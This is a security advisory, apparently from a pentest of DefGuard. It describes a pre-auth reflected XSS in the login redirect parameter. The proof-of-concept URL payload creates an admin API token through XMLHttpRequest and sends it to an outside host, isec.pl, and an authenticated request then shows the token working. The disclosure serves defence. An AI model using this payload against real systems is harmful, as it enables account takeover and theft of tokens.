---
title: "DG25-18: Reflected Cross-Site Scripting (XSS) leading to full account takeover"
severity: High
cvss_score: 8.1
cvss_string: "/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
issue_link: https://github.com/DefGuard/defguard/issues/1559
status: Completed
---

### Technical details

1.  Non logged-in user visits below link:

`https://defguard.dvpnsec.net/auth/login?r=javascript:alert(document.domain)`

2.  After providing username and password and clicking Login button, XSS
    will be executed.

![](/images/pentest/DG25/img6.png)

The main issue with above payload, is that this is an pre-auth XSS. It
executes after clicking Login button - but before assigning the user\'s
session.To bypass this limitation - we\'ve used the window.open - to
open the DefGuard in the new window - where user will be finally logged
in - thus the session will be assigned to the user.As soon as the user
becomes logged in - we\'re utilizing XMLHttpRequest to create new API
Token via /api/v1/user/admin/api_token and send its result back to
isec.pl.

#### PoC - full account takeover:

1.  Non logged-in user visits below link:

`https://defguard.dvpnsec.net/auth/login?r=javascript:window.open('https://defguard.dvpnsec.net');var
xmlhttp = new XMLHttpRequest();xmlhttp.onreadystatechange = (e) =>
{window.location='https://isec.pl?'%2bxmlhttp.responseText};xmlhttp.open("POST",
"/api/v1/user/admin/api_token");xmlhttp.setRequestHeader("Content-Type",
"application/json");xmlhttp.send(JSON.stringify({ "name":
"qweqwe123xxxxxxx", "username": "admin" }))`

2.  After providing username and password and clicking Login button, XSS
    will be executed.

3.  window.open() assigns session to the current DOM.

4.  XMLHttpRequest sends request to `/api/v1/user/admin/api_token` which creates new API Token.

5.  API Token value is being send back to the attacker server via\
    window.location: `https://isec.pl/?{%22token%22:%22dg-ZAf9lWt6tJShBD6KzahF475GfDSAzAJa%22}`

1.  Attacker has now access to the freshly created API Token and can use
    it to perform operation on behalf of admin:

**Request:**\
\
**GET** /api/v1/me HTTP/2\
**Host:** defguard.dvpnsec.net\
**Authorization:** Bearer dg-ZAf9lWt6tJShBD6KzahF475GfDSAzAJa\
\
\
**Response:**\
\
**HTTP/2** 200 OK\
**Alt-Svc:** h3=\":443\"; ma=2592000\
**Content-Type:** application/json\
**Date:** Fri, 08 Aug 2025 13:59:38 GMT\
**Server:** Caddy\
**X-Defguard-Version:** 1.5.0-a29ac10\
**Content-Length:** 456\

```json
{ 
 "authorized_apps ":  [ 
 [ ... ] 
 ], 
 "email ":  "admin@defguard ", 
 "email_mfa_enabled ": false, 
 "enrolled ": true, 
 "first_name ":  "DefGuard ", 
 "groups ":  [ 
 "admin " 
 ], 
 "id ": 1, 
 "is_active ": true, 
 "is_admin ": true, 
 "last_name ":  "Administrator ", 
 "ldap_pass_requires_change ": false, 
 "mfa_enabled ": false, 
 "mfa_method ":  "None ", 
 "phone ":  " ", 
 "totp_enabled ": false, 
 "username ":  "admin " 
}
```